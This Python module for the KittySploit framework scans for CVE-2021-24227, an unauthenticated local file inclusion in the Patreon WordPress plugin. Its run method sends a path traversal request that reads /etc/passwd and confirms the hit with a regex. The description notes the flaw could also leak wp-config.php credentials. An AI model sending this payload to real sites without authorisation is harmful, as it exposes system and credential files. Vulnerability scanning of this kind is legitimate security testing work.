#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Patreon WordPress before version 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Patreon WordPress  <1.7.0 - Unauthenticated Local File Inclusion Detection',
        'description': 'Patreon WordPress before version 1.7.0 is vulnerable to unauthenticated local file inclusion that could be abused by anyone visiting the site. Exploitation by an attacker could leak important internal files like wp-config.php, which contains database credentials and cryptographic keys used in the generation of nonces and cookies.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wordpress', 'patreon-connect', 'unauth', 'lfi', 'patreon', 'wp', 'wpscan', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/f62df02d-7678-440f-84a1-ddbf09364016',
            'https://wordpress.org/plugins/patreon-connect/',
            'https://jetpack.com/2021/03/26/vulnerabilities-found-in-patreon-wordpress-plugin/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24227',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-24227',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?patron_only_image=../../../../../../../../../../etc/passwd&patreon_action=serve_patron_only_image', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Patreon WordPress  <1.7.0 - Unauthenticated Local File Inclusion detected",
                path='/?patron_only_image=../../../../../../../../../../etc/passwd&patreon_action=serve_patron_only_image',
            )
            return True
        return False

